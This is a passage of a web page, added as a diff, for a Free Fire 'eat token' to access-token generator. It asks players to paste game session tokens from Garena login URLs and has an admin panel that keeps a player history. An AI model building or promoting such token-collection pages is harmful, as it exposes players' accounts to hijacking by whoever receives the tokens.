@@ -1,0 +1,1561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="description" content="Generate Free Fire access tokens easily with Prime 4x's Access Generator." />
+  <title>Free Fire Eat To access Token Tool | Prime 4x</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Rajdhani:wght@500;600;700&display=swap');
+    :root{--primary:#D92656;--primary-glow:rgba(217,38,86,0.35);--dark-bg:#000000;--admin:#F10E30;--info:#06BCF9;}
+    body{font-family:'Space Grotesk',sans-serif;background-color:var(--dark-bg);color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow-x:hidden;padding:20px;background-image:linear-gradient(rgba(255,255,255,0.03)1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.03)1px,transparent 1px);background-size:30px 30px;}
+    .cyber-card{background:rgba(10,10,12,0.7);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,0.08);border-radius:24px;box-shadow:0 20px 40px -10px rgba(0,0,0,0.5);position:relative;overflow:hidden;}
+    .cyber-card::before{content:"";position:absolute;inset:0;border-radius:24px;padding:1px;background:linear-gradient(180deg,rgba(255,255,255,0.15),transparent 60%);-webkit-mask:linear-gradient(#fff 0 0)content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none;}
+    .title-font{font-family:'Rajdhani',sans-serif;}
+    .cyber-input{background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.1);color:#fff;font-family:monospace;transition:all 0.3s ease;}
+    .cyber-input:focus{border-color:var(--primary);background:rgba(0,0,0,0.6);box-shadow:0 0 20px var(--primary-glow);outline:none;}
+    .btn-grad{background-image:linear-gradient(to right,#D92656 0%,#D92656 51%,#D92656 100%);background-size:200% auto;transition:0.5s;border:none;box-shadow:0 0 20px rgba(217,38,86,0.3);}
+    .btn-grad:hover{background-position:right center;box-shadow:0 0 30px rgba(217,38,86,0.5);transform:translateY(-1px);}
+    .social-icon-btn{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.05);transition:0.2s;}
+    .social-icon-btn:hover{background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.2);transform:translateY(-2px);}
+    .modal-overlay{background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);opacity:0;visibility:hidden;transition:0.3s;}
+    .modal-overlay.active{opacity:1;visibility:visible;}
+    .animate-in{animation:fadeIn 0.4s ease forwards;}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+    @keyframes zoomIn{from{opacity:0;transform:scale(0.7);}to{opacity:1;transform:scale(1);}}
+    .tutorial-link{background:rgba(217,38,86,0.1);border:1px dashed #D92656;transition:all 0.2s;}
+    .tutorial-link:hover{background:rgba(217,38,86,0.2);border-color:#D92656;}
+    .copy-btn-success{background-color:#10b981 !important;transition:0.2s;}
+    .scroll-box{background:linear-gradient(135deg,rgba(217,38,86,0.15)0%,rgba(217,38,86,0.1)100%);border-left:3px solid #D92656;max-height:120px;overflow-y:auto;padding:12px;border-radius:8px;font-family:monospace;font-size:11px;word-break:break-all;color:#fff;}
+    .scroll-box-large{background:linear-gradient(135deg,rgba(217,38,86,0.15)0%,rgba(217,38,86,0.1)100%);border-left:3px solid #D92656;max-height:250px;overflow-y:auto;padding:12px;border-radius:8px;font-family:monospace;font-size:11px;word-break:break-all;color:#fff;white-space:pre-wrap;}
+    .scroll-box::-webkit-scrollbar,.scroll-box-large::-webkit-scrollbar{width:4px;}
+    .scroll-box::-webkit-scrollbar-thumb,.scroll-box-large::-webkit-scrollbar-thumb{background:#D92656;border-radius:4px;}
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+    .info-item{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:8px 12px;}
+    .info-item .label{font-size:9px;text-transform:uppercase;color:#D92656;letter-spacing:0.5px;font-weight:600;}
+    .info-item .value{font-size:13px;font-weight:600;color:#fff;margin-top:2px;font-family:monospace;}
+    .scroll-box-token{background:linear-gradient(135deg,rgba(217,38,86,0.15)0%,rgba(217,38,86,0.1)100%);border-left:3px solid #D92656;max-height:150px;overflow-y:auto;padding:12px;border-radius:8px;font-family:monospace;font-size:11px;word-break:break-all;color:#fff;}
+    .scroll-box-token::-webkit-scrollbar{width:4px;}
+    .scroll-box-token::-webkit-scrollbar-thumb{background:#D92656;border-radius:4px;}
+    /* ===== ADMIN ===== */
+    .admin-btn{background-color:var(--admin);border:none;box-shadow:0 0 15px rgba(241,14,48,0.4);}
+    .admin-btn:hover{box-shadow:0 0 25px rgba(241,14,48,0.6);}
+    .logo-wrap{position:relative;cursor:pointer;display:flex;align-items:center;justify-content:center;}
+    .logo-wrap::before{content:"";position:absolute;inset:-4px;border-radius:9999px;border:3px solid transparent;border-top-color:#3C8BC3;border-right-color:#06BCF9;box-shadow:0 0 18px rgba(60,139,195,.75);animation:logoSpin 1.2s linear infinite;pointer-events:none;z-index:0;}
+    .logo-wrap img{position:relative;z-index:1;pointer-events:none;}
+    .logo-wrap:focus-visible{outline:2px solid #06BCF9;outline-offset:5px;}
+    @keyframes logoSpin{to{transform:rotate(360deg);}}
+    .home-logout{display:none;margin:-1px auto 8px;width:118px;}
+    .home-logout.show{display:flex;}
+    #adminDpMini{display:none!important;}
+    #welcomeBoss .welcome-ring{position:relative;width:96px;height:96px;border-radius:50%;padding:4px;background:transparent;display:flex;align-items:center;justify-content:center;}
+    #welcomeBoss .welcome-ring::before{content:"";position:absolute;inset:0;border-radius:50%;border:4px solid transparent;border-top-color:#3C8BC3;border-right-color:#3C8BC3;box-shadow:0 0 30px rgba(60,139,195,.8);animation:logoSpin 1.1s linear infinite;}
+    #welcomeBoss .welcome-ring img{position:relative;z-index:1;width:88px;height:88px;border-radius:50%;object-fit:cover;background:#000;}
+    #welcomeBoss .welcome-title{color:#3C8BC3!important;text-shadow:0 0 18px rgba(60,139,195,.45)!important;animation:welcomeBluePulse 1.6s ease-in-out infinite!important;}
+    @keyframes welcomeBluePulse{0%,100%{color:#3C8BC3!important;text-shadow:0 0 12px rgba(60,139,195,.35)!important;}50%{color:#06BCF9!important;text-shadow:0 0 28px rgba(6,188,249,.8)!important;}}
+    .login-card{border:1px solid rgba(60,139,195,.45)!important;box-shadow:0 0 40px rgba(60,139,195,.12),0 25px 70px rgba(0,0,0,.65);}
+    .login-icon{color:#3C8BC3;}
+    .login-input:focus{border-color:#3C8BC3!important;box-shadow:0 0 20px rgba(60,139,195,.25)!important;}
+    .admin-edit-btn{background:rgba(6,188,249,.12);border:1px solid rgba(6,188,249,.45);color:#06BCF9;}
+    .admin-edit-btn:hover{background:rgba(6,188,249,.25);}
+    .pw-wrap{position:relative;}
+    .pw-toggle{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;color:#9ca3af;background:none;border:none;}
+    .pw-toggle:hover{color:var(--admin);}
+    #adminPage{display:none;min-height:100vh;width:100%;justify-content:center;align-items:flex-start;padding-top:28px;padding-bottom:40px;}
+    #mainPage{display:flex;}
+    #adminProfilePage{display:none;min-height:100vh;width:100%;justify-content:center;align-items:flex-start;padding-top:28px;padding-bottom:40px;}
+    #welcomeBoss{display:none;position:fixed;inset:0;z-index:200;background:#000;flex-direction:column;align-items:center;justify-content:center;}
+    #welcomeBoss.show{display:flex;animation:zoomIn 0.6s ease;}
+    .admin-banner{width:100%;height:120px;object-fit:cover;border-radius:12px;background:rgba(0,0,0,0.4);}
+    .admin-dp{width:80px;height:80px;border-radius:50%;object-fit:cover;border:3px solid var(--admin);box-shadow:0 0 25px rgba(241,14,48,0.5);margin-top:-40px;background:#000;}
+    .del-btn{background:rgba(241,14,48,0.2);border:1px solid var(--admin);color:#fff;transition:0.2s;cursor:pointer;}
+    .del-btn:hover{background:var(--admin);}
+    .player-banner-img{width:100%;max-height:140px;object-fit:contain;border-radius:8px;background:rgba(0,0,0,0.4);}
+    .upload-btn{background:rgba(255,255,255,0.06);border:1px dashed rgba(255,255,255,0.3);color:#fff;cursor:pointer;transition:0.2s;}
+    .upload-btn:hover{border-color:var(--admin);background:rgba(241,14,48,0.1);}
+    .tab-btn{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);color:#9ca3af;transition:0.2s;cursor:pointer;}
+    .tab-btn.active{background:rgba(241,14,48,0.2);border-color:var(--admin);color:#fff;}
+    .msg-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:10px;margin-bottom:8px;}
+    .reply-box{background:rgba(16,185,129,0.08);border-left:3px solid #10b981;border-radius:8px;padding:8px;margin-top:6px;font-size:10px;}
+    /* Player History list (#06BCF9) */
+    .ph-name{background:rgba(6,188,249,0.08);border:1px solid rgba(6,188,249,0.3);border-radius:10px;padding:10px 12px;margin-bottom:8px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:10px;}
+    .ph-name:hover{background:rgba(6,188,249,0.18);border-color:var(--info);}
+    .ph-name .num{color:var(--info);font-weight:bold;font-size:12px;font-family:monospace;}
+    .ph-name .pname{color:#fff;font-weight:bold;font-size:12px;}
+    .ph-name .chev{margin-left:auto;color:var(--info);font-size:11px;transition:0.2s;}
+    .ph-detail{display:none;background:rgba(6,188,249,0.05);border:1px solid rgba(6,188,249,0.35);border-radius:12px;padding:12px;margin:-4px 0 10px 0;}
+    .ph-detail.open{display:block;animation:fadeIn 0.3s ease;}
+    .ph-label{font-size:9px;text-transform:uppercase;color:var(--info);letter-spacing:0.5px;font-weight:700;}
+    .ph-value{font-size:12px;color:#fff;font-family:monospace;word-break:break-all;}
+    .msg-img{max-width:100%;max-height:150px;border-radius:8px;margin-top:6px;border:1px solid rgba(255,255,255,0.15);}
+    .p4x-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(60,139,195,.12);border:1px solid rgba(60,139,195,.45);color:#06BCF9;border-radius:999px;padding:4px 9px;font-size:9px;font-weight:900;font-family:monospace;letter-spacing:.5px;}
+    .p4x-status{display:inline-flex;align-items:center;gap:5px;border-radius:999px;padding:4px 8px;font-size:8px;font-weight:900;text-transform:uppercase;}
+    .p4x-status.pending{color:#fbbf24;background:rgba(251,191,36,.10);border:1px solid rgba(251,191,36,.30);}
+    .p4x-status.replied{color:#34d399;background:rgba(52,211,153,.10);border:1px solid rgba(52,211,153,.30);}
+    .p4x-ticket{background:rgba(6,188,249,.06);border:1px solid rgba(6,188,249,.25);border-radius:10px;padding:9px;margin-bottom:8px;}
+    .p4x-ticket input{font-family:monospace;}
+        .user-item{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:10px 12px;margin-bottom:8px;display:flex;align-items:center;gap:10px;}
+  
+    .admin-profile-head{border:1px solid rgba(60,139,195,.25);border-radius:16px;overflow:hidden;background:rgba(255,255,255,.025);}
+    .admin-banner-wrap{height:112px;background:#050505;overflow:hidden;}
+    .panel-admin-banner{width:100%;height:100%;object-fit:cover;display:block;}
+    .panel-admin-profile{display:flex;align-items:center;gap:10px;padding:10px 12px;}
+    .panel-admin-dp{width:58px;height:58px;border-radius:50%;object-fit:cover;border:2px solid #3C8BC3;box-shadow:0 0 18px rgba(60,139,195,.45);background:#000;}
+    .verified-tick{display:inline-flex;align-items:center;justify-content:center;width:17px;height:17px;border-radius:50%;background:#1d9bf0;color:#fff;font-size:11px;font-weight:900;box-shadow:0 0 10px rgba(29,155,240,.55);}
+    .panel-logout-btn{background:rgba(241,14,48,.14);border:1px solid rgba(241,14,48,.55);color:#fff;white-space:nowrap;}
+    .panel-logout-btn:hover{background:rgba(241,14,48,.3);}
+    .tab-btn.active{background:rgba(60,139,195,.2);border-color:#3C8BC3;color:#fff;box-shadow:0 0 12px rgba(60,139,195,.15);}
+
+/* ===== UNIQUE ADMIN ID ACTION BUTTONS ===== */
+.admin-action-row{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:7px;margin-top:10px;}
+.admin-action-btn{border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:8px 5px;font-size:8px;font-weight:900;letter-spacing:.4px;cursor:pointer;transition:.2s;display:flex;align-items:center;justify-content:center;gap:4px;min-height:34px;background:rgba(255,255,255,.04);color:#fff;}
+.admin-action-btn:hover{transform:translateY(-2px);filter:brightness(1.12);}
+.admin-action-btn:active{transform:scale(.96);}
+.admin-action-btn.activate{color:#34d399;border-color:rgba(52,211,153,.35);background:rgba(52,211,153,.10);}
+.admin-action-btn.deactivate{color:#fbbf24;border-color:rgba(251,191,36,.35);background:rgba(251,191,36,.10);}
+.admin-action-btn.block{color:#fb7185;border-color:rgba(251,113,133,.38);background:rgba(251,113,133,.10);}
+.admin-action-btn.edit{color:#38bdf8;border-color:rgba(56,189,248,.38);background:rgba(56,189,248,.10);}
+.admin-action-btn.delete{color:#c084fc;border-color:rgba(192,132,252,.38);background:rgba(192,132,252,.10);}
+@media(max-width:520px){.admin-action-row{grid-template-columns:repeat(2,1fr);}.admin-action-btn:last-child{grid-column:1/-1;}}
+</style>
+</head>
+<body>
+
+  <!-- WELCOME BOSS SCREEN -->
+  <div id="welcomeBoss">
+    <div class="welcome-ring mb-4" style="animation:zoomIn 0.6s ease;">
+      <img id="welcomeDp" src="https://avatars.githubusercontent.com/u/312629158?s=400&u=40d93dc807fa18e553bc1ac476d625471766150a&v=4" alt="Boss" />
+    </div>
+    <h1 class="welcome-title text-4xl font-bold title-font tracking-widest text-center" style="animation:zoomIn 0.8s ease;">WELCOME BOSS</h1>
+    <p class="text-xs text-gray-500 mt-3 tracking-widest uppercase">Admin Panel Loading...</p>
+  </div>
+
+  <!-- ============ MAIN PAGE (HOME) ============ -->
+  <div id="mainPage" class="w-full relative z-10">
+    <div class="w-full max-w-[480px]">
+      <div class="cyber-card p-6 sm:p-8">
+
+        <div class="flex flex-col items-center mb-6">
+          <div id="homeLogo" class="logo-wrap relative w-20 h-20 mb-3 rounded-full p-1 bg-black shadow-[0_0_40px_rgba(60,139,195,0.28)]" onclick="handleLogoClick()" role="button" tabindex="0" aria-label="Admin login or admin panel">
+            <img src="https://avatars.githubusercontent.com/u/312629158?s=400&u=40d93dc807fa18e553bc1ac476d625471766150a&v=4" class="w-full h-full rounded-full object-cover bg-black" alt="Killer Sharma Logo" />
+          </div>
+          <button id="homeLogoutBtn" onclick="doLogout()" class="home-logout admin-btn items-center justify-center gap-2 text-[11px] text-white font-bold px-4 py-2 rounded-lg tracking-wider transition" type="button">
+            <i class="fas fa-sign-out-alt"></i> LOGOUT
+          </button>
+          <h1 class="text-2xl font-bold title-font text-white text-center leading-tight">
+            FF ACCESS GENERATOR
+            <br />
+            <span class="text-lg font-bold" style="color:#3C8BC3;">Web Create by Prime 4x</span>
+          </h1>
+        </div>
+
+        <a href="https://youtu.be/2OMif-tL1aM" target="_blank" class="tutorial-link w-full flex items-center justify-between gap-2 p-3 rounded-xl mb-3 transition group">
+          <div class="flex items-center gap-3">
+            <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/YouTube.png" class="w-5 h-5 object-contain" alt="YT" />
+            <div class="text-left">
+              <span class="text-[11px] font-bold text-white uppercase tracking-wider">FULL TUTORIAL</span>
+              <p class="text-[9px] text-gray-400">click to watch how to get eat token</p>
+            </div>
+          </div>
+          <i class="fas fa-arrow-right text-fuchsia-400 group-hover:translate-x-1 transition"></i>
+        </a>
+
+        <a href="https://youtu.be/tehenN6aR08" target="_blank" class="tutorial-link w-full flex items-center justify-between gap-2 p-3 rounded-xl mb-6 transition group">
+          <div class="flex items-center gap-3">
+            <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/YouTube.png" class="w-5 h-5 object-contain" alt="YT" />
+            <div class="text-left">
+              <span class="text-[11px] font-bold text-white uppercase tracking-wider">2nd METHOD</span>
+              <p class="text-[9px] text-gray-400">click to watch how to get access token</p>
+            </div>
+          </div>
+          <i class="fas fa-arrow-right text-fuchsia-400 group-hover:translate-x-1 transition"></i>
+        </a>
+
+        <div class="bg-white/5 border border-white/10 rounded-xl p-4 mb-6">
+          <div class="flex items-center gap-2 mb-3 border-b border-white/5 pb-2">
+            <i class="fas fa-book-open text-fuchsia-400 text-xs"></i>
+            <span class="text-xs font-bold text-white uppercase tracking-wider">How to use</span>
+          </div>
+          <div class="space-y-4">
+            <div class="flex gap-3 text-[11px] text-gray-400">
+              <span class="bg-fuchsia-500/20 text-fuchsia-400 font-bold px-2 py-0.5 rounded text-[10px] h-fit mt-0.5">1</span>
+              <div>
+                <p>Select Provider &amp; Login below.</p>
+                <p class="text-[10px] text-green-500 mt-0.5"><i class="fas fa-shield-alt"></i> Safe: Official Garena Server (No Scam Risk)</p>
+              </div>
+            </div>
+            <div class="flex gap-3 text-[11px] text-gray-400">
+              <span class="bg-fuchsia-500/20 text-fuchsia-400 font-bold px-2 py-0.5 rounded text-[10px] h-fit mt-0.5">2</span>
+              <div class="w-full">
+                <p class="mb-2">After login, copy the URL containing <code class="text-fuchsia-300">eat=</code> parameter</p>
+                <div class="bg-fuchsia-500/5 border border-fuchsia-500/10 p-2 rounded mb-2">
+                  <p class="text-[10px] text-gray-400 mb-1">Example URL:</p>
+                  <code class="text-[9px] text-gray-300 break-all block leading-tight">https://discstore.kiosgamer.com.id/?eat=14f060774299fb93a5...&amp;lang=en&amp;region=IND&amp;account_id=7669969208&amp;nickname=...</code>
+                </div>
+                <p class="text-[10px] text-gray-500">The tool will extract the eat token automatically</p>
+              </div>
+            </div>
+            <div class="flex gap-3 text-[11px] text-gray-400">
+              <span class="bg-fuchsia-500/20 text-fuchsia-400 font-bold px-2 py-0.5 rounded text-[10px] h-fit mt-0.5">3</span>
+              <p>Paste the URL or just the <strong class="text-white">Eat Token</strong> below and click GENERATE</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-5">
+          <div class="flex justify-between items-end mb-2">
+            <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Select Provider &amp; Login</span>
+          </div>
+          <div class="grid grid-cols-5 gap-2">
+            <a href="https://auth.garena.com/universal/oauth?platform=8&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-icon-btn h-11 rounded-lg flex items-center justify-center">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Google.png" class="w-5 h-5 object-contain" />
+            </a>
+            <a href="https://auth.garena.com/universal/oauth?platform=3&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-icon-btn h-11 rounded-lg flex items-center justify-center">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Facebook.png" class="w-5 h-5 object-contain" />
+            </a>
+            <a href="https://auth.garena.com/universal/oauth?platform=10&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-icon-btn h-11 rounded-lg flex items-center justify-center">
+              <i class="fab fa-apple text-xl text-white"></i>
+            </a>
+            <a href="https://auth.garena.com/universal/oauth?platform=11&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-icon-btn h-11 rounded-lg flex items-center justify-center">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/X.png" class="w-5 h-5 object-contain rounded-full" />
+            </a>
+            <a href="https://auth.garena.com/universal/oauth?platform=5&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="social-icon-btn h-11 rounded-lg flex items-center justify-center">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/VK.png" class="w-5 h-5 object-contain rounded-full" />
+            </a>
+          </div>
+        </div>
+
+        <div class="mb-5">
+          <div class="relative group">
+            <input type="text" id="tokenInp" class="cyber-input w-full rounded-xl py-3.5 pl-4 pr-10 text-sm placeholder-gray-600" placeholder="Paste kiosgamer URL or Eat token here..." autocomplete="off" />
+            <button onclick="clearInput()" id="clearBtn" class="absolute right-3 top-3.5 text-gray-500 hover:text-red-500 transition hidden">
+              <i class="fas fa-times text-lg"></i>
+            </button>
+          </div>
+          <div class="flex justify-between mt-2">
+            <span class="text-[10px] text-gray-600">Supports full URL or raw token</span>
+          </div>
+        </div>
+
+        <button onclick="processToken()" id="btn" class="btn-grad w-full rounded-xl py-4 font-bold title-font text-white text-base tracking-widest flex items-center justify-center gap-2 mb-6">
+          GENERATE ACCESS TOKEN
+          <i class="fas fa-arrow-right text-xs"></i>
+        </button>
+
+        <div id="bannerContainer" class="hidden animate-in mb-6">
+          <div class="bg-black/40 border border-fuchsia-500/30 rounded-xl p-4">
+            <div class="text-[10px] font-bold text-fuchsia-400 uppercase tracking-wider mb-3 text-center">Player Banner</div>
+            <div id="bannerImageWrapper" class="flex justify-center">
+              <img id="bannerImage" src="" alt="Player Banner" class="rounded-lg w-full" style="max-height:200px;object-fit:contain;" />
+            </div>
+          </div>
+        </div>
+
+        <div id="output" class="hidden animate-in mb-6">
+          <div class="bg-black/40 border border-fuchsia-500/30 rounded-xl p-4 relative overflow-hidden">
+            <div class="info-grid">
+              <div class="info-item">
+                <div class="label">Nickname</div>
+                <div class="value" id="nick">-</div>
+              </div>
+              <div class="info-item">
+                <div class="label">Region</div>
+                <div class="value" id="reg">-</div>
+              </div>
+              <div class="info-item">
+                <div class="label">Account UID</div>
+                <div class="value" id="aid">-</div>
+              </div>
+              <div class="info-item">
+                <div class="label">Level</div>
+                <div class="value" id="level">-</div>
+              </div>
+            </div>
+            <div class="mb-4 mt-4">
+              <div class="flex justify-between items-center mb-2">
+                <span class="text-[10px] font-bold text-fuchsia-400 uppercase tracking-wider">Extracted Access Token</span>
+                <button onclick="copyAccessTokenOnly()" id="copyTokenBtn" class="text-[10px] bg-fuchsia-600/40 hover:bg-fuchsia-600 px-3 py-1.5 rounded-lg transition flex items-center gap-1">
+                  <i class="fas fa-copy text-[10px]"></i> COPY TOKEN
+                </button>
+              </div>
+              <div class="scroll-box-token" id="accessTokenDisplay">-</div>
+            </div>
+            <div id="jwtContainer" class="mb-4 hidden">
+              <div class="flex justify-between items-center mb-2">
+                <span class="text-[10px] font-bold text-fuchsia-400 uppercase tracking-wider">JWT Token</span>
+                <button onclick="copyJwtTokenOnly()" id="copyJwtBtn" class="text-[10px] bg-fuchsia-600/40 hover:bg-fuchsia-600 px-3 py-1.5 rounded-lg transition flex items-center gap-1">
+                  <i class="fas fa-copy text-[10px]"></i> COPY JWT
+                </button>
+              </div>
+              <div class="scroll-box" id="jwtTokenDisplay">-</div>
+            </div>
+            <div class="mb-2">
+              <div class="flex justify-between items-center mb-2">
+                <span class="text-[10px] font-bold text-fuchsia-400 uppercase tracking-wider">Full API Response</span>
+                <button onclick="copyFullResponse()" id="copyFullResponseBtn" class="text-[10px] bg-fuchsia-600/40 hover:bg-fuchsia-600 px-3 py-1.5 rounded-lg transition flex items-center gap-1">
+                  <i class="fas fa-copy text-[10px]"></i> COPY FULL
+                </button>
+              </div>
+              <div class="scroll-box-large" id="apiResponseDisplay">Waiting for response...</div>
+            </div>
+          </div>
+        </div>
+
+        <div id="error-box" class="hidden animate-in mb-6">
+          <div class="bg-red-500/10 border border-red-500/30 rounded-xl p-4 text-center">
+            <i class="fas fa-exclamation-triangle text-red-500 text-2xl mb-2"></i>
+            <h3 class="text-red-400 font-bold text-sm uppercase tracking-wider" id="error-title">Error</h3>
+            <p class="text-[10px] text-gray-500 mt-1" id="error-message">Please try again later.</p>
+          </div>
+        </div>
+
+        <!-- ============ MESSAGE FOR ADMIN ============ -->
+        <div class="flex justify-center mb-6">
+          <button onclick="openModal('messageModal')" class="tutorial-link px-5 py-2.5 rounded-xl text-[10px] font-bold text-white tracking-widest uppercase transition">
+            <i class="fas fa-envelope mr-1"></i> MESSAGE FOR ADMIN
+          </button>
+        </div>
+
+        <div class="border-t border-white/5 pt-5">
+          <p class="text-[10px] text-gray-500 text-center uppercase tracking-widest mb-3">Connect With Prime 4x</p>
+          <div class="grid grid-cols-2 gap-2">
+            <a href="https://t.me/" target="_blank" class="flex items-center gap-2 p-2.5 rounded-xl bg-[#1a1a1a] hover:bg-[#29b6f6]/10 border border-white/5 hover:border-[#29b6f6]/30 transition group">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Telegram.png" class="w-6 h-6 rounded-full" />
+              <span class="text-xs font-medium text-gray-400 group-hover:text-white">Telegram</span>
+            </a>
+            <a href="https://youtube.com/@" target="_blank" class="flex items-center gap-2 p-2.5 rounded-xl bg-[#1a1a1a] hover:bg-red-500/10 border border-white/5 hover:border-red-500/30 transition group">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/YouTube.png" class="w-6 h-6 rounded-full" />
+              <span class="text-xs font-medium text-gray-400 group-hover:text-white">YouTube</span>
+            </a>
+            <a href="https://instagram.com/" target="_blank" class="flex items-center gap-2 p-2.5 rounded-xl bg-[#1a1a1a] hover:bg-pink-500/10 border border-white/5 hover:border-pink-500/30 transition group">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/Instagram.png" class="w-6 h-6 rounded-full" />
+              <span class="text-xs font-medium text-gray-400 group-hover:text-white">Instagram</span>
+            </a>
+            <a href="https://github.com/Prime-4x" target="_blank" class="flex items-center gap-2 p-2.5 rounded-xl bg-[#1a1a1a] hover:bg-gray-500/10 border border-white/5 hover:border-gray-500/30 transition group">
+              <img src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/GitHub.png" class="w-6 h-6 rounded-full bg-white" />
+              <span class="text-xs font-medium text-gray-400 group-hover:text-white">GitHub</span>
+            </a>
+          </div>
+          <div class="text-center mt-4">
+            <button onclick="openModal('termsModal')" class="text-[10px] text-gray-600 hover:text-gray-400 underline transition">Terms &amp; Conditions</button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ ADMIN PANEL PAGE ============ -->
+  <div id="adminPage">
+    <div class="w-full max-w-[520px]">
+      <div class="cyber-card p-5 sm:p-7">
+
+        <!-- ADMIN PROFILE: CENTERED DP + NAME + OWNER ROLE -->
+        <div class="admin-profile-head mb-4">
+          <div class="admin-banner-wrap relative">
+            <img id="panelAdminBanner" src="https://raw.githubusercontent.com/KillerSharmaBot/Eat-Token/refs/heads/main/image/YouTube.png" class="panel-admin-banner" alt="Admin Banner" />
+          </div>
+          <div class="flex flex-col items-center text-center px-3 pt-3 pb-3">
+            <div class="relative -mt-10">
+              <img id="adminDpMini2" src="https://avatars.githubusercontent.com/u/312629158?s=400&u=40d93dc807fa18e553bc1ac476d625471766150a&v=4" class="panel-admin-dp" style="width:78px;height:78px;border-width:3px;" alt="Admin Profile" />
+            </div>
+            <div class="flex items-center justify-center gap-1.5 mt-2">
+              <h2 id="adminWhoamiName" class="text-lg font-bold title-font text-white">Prime 4x</h2>
+              <span id="ownerVerifiedTick" class="verified-tick hidden" title="Verified Owner">✓</span>
+            </div>
+            <p id="adminWhoamiRole" class="text-[10px] text-gray-500 uppercase tracking-widest mt-1">WEBSITE OWNER</p>
+            <div class="flex items-center justify-center gap-2 mt-3">
+              <button onclick="document.getElementById('dpUploadMain').click()" class="upload-btn text-[9px] font-bold px-3 py-2 rounded-lg">
+                <i class="fas fa-camera"></i> DP ADD
+              </button>
+              <button onclick="document.getElementById('bannerUploadMain').click()" class="upload-btn text-[9px] font-bold px-3 py-2 rounded-lg">
+                <i class="fas fa-image"></i> BANNER ADD
+              </button>
+            </div>
+            <input type="file" id="dpUploadMain" accept="image/*" class="hidden" onchange="changeAdminImage(this,'dp')" />
+            <input type="file" id="bannerUploadMain" accept="image/*" class="hidden" onchange="changeAdminImage(this,'banner')" />
+          </div>
+        </div>
+
+        <!-- OWNER PASSWORD UPDATE -->
+        <div id="ownerPasswordBox" class="hidden bg-white/5 border rounded-xl p-4 mb-4" style="border-color:rgba(60,139,195,.35);">
+          <div class="flex items-center gap-2 mb-3 border-b border-white/5 pb-2">
+            <i class="fas fa-key" style="color:#3C8BC3;"></i>
+            <span class="text-xs font-bold text-white uppercase tracking-wider">UPDATE OWNER PASSWORD</span>
+          </div>
+          <div id="ownerPasswordMsg" class="hidden text-[10px] mb-2"></div>
+          <div class="pw-wrap mb-2">
+            <input type="password" id="ownerOldPassword" class="cyber-input w-full rounded-xl py-2.5 px-3 pr-10 text-xs" placeholder="Old Password" autocomplete="current-password" />
+            <button type="button" class="pw-toggle" onclick="toggleOwnerPassword('ownerOldPassword','ownerOldEye')"><i id="ownerOldEye" class="fas fa-eye"></i></button>
+          </div>
+          <div class="pw-wrap mb-2">
